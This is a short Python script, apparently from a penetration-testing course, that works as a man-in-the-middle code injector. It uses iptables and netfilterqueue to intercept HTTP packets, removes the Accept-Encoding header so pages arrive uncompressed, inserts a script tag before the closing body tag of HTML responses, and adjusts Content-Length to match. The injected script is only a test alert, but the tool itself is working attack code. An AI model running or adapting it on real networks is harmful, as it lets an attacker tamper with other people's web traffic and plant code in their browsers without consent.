#!/usr/bin/env python

"""
Code injector

- # run iptables
- iptables -I INPUT -j NFQUEUE --queue-num 0
- iptables -I OUTPUT -j NFQUEUE --queue-num 0
- # flush tables
- iptables --flush

gzip format - encodes and compresses HTML
"""

import scapy.all as scapy
import netfilterqueue
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            # replace all encoding
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            injection = "<script>alert('test');</script></body>"
            load = load.replace("</body>", injection)
            len_search = re.search(r"(?:Content-Length:\s)(\d*)", load)
            if len_search and "text/html" in load:
                content_len = len_search.group(1)
                new_len = int(content_len) + len(injection)
                load = load.replace(content_len, str(new_len))
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
